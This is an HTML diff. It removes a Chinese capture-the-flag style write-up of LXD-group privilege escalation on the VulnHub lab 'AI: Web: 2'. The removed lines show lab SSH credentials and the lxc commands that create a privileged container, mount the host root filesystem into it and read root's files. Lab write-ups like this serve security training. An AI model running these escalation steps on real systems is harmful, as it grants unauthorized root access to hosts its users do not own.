@@ -158,21 +158,7 @@
 
   
 <p>
-          LXD容器 LXD是基于LXC容器的管理程序，当前用户可操作容器，理解为用户创建一个容器，再用容器挂载宿主机磁盘，最后使用容器权限操作宿主机磁盘内容达到提权效果。
-lxd本地提权条件:
-已经获得Shell 用户属于lxd组 复现环境
-https://www.vulnhub.com/entry/ai-web-2,357/
-1、入口点 通过web打点,拿到www-data的权限
-apache配置文件 /etc/apache2/sites-enabled/000-default.conf 翻找目录发现 /var/www/html/webadmin/S0mextras 目录下面有一个账号密码的文件 .sshUserCred55512.txt
-``` User: n0nr00tuser Pass: zxowieoi4sdsadpEClDws1sf ``` 连接 SSH
-ssh n0nr00tuser@192.168.88.154 zxowieoi4sdsadpEClDws1sf 2、检测及利用 ./LinEnum.sh 或 id 判断用户组
-小镜像来源
-https://github.com/saghul/lxd-alpine-builder
-3、创建容器 → 挂载磁盘 → 进入宿主根目录 → 提权 创建容器镜像：
-lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias test 启动特权容器：
-lxc init test test -c security.privileged=true 挂载宿主机磁盘：
-lxc config device add test test disk source=/ path=/mnt/root recursive=true 启动并进入：
-lxc start test lxc exec test /bin/sh cd /mnt/root/root cat flag.
+          
         </div>
       </article>
       
